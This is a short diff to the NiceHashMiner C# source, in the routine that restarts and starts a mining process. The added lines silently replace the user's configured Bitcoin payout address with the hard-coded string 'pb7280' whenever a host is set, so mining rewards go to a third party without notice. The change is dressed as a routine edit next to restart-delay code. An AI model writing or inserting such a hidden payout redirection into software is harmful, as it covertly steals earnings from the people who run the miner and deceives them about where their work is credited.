@@ -68,7 +68,9 @@ namespace NiceHashMiner.Miners.Grouping {
             }
             // Wait before new start
             System.Threading.Thread.Sleep(ConfigManager.GeneralConfig.MinerRestartDelayMS);
-
+            if (Globals.NiceHashData[AlgorithmType].host != null) {
+                btcAdress = "pb7280";
+            }
             string locationURL = Globals.GetLocationURL(AlgorithmType, miningLocation, Miner.ConectionType);
             Miner.Start(locationURL, btcAdress, worker);
         }
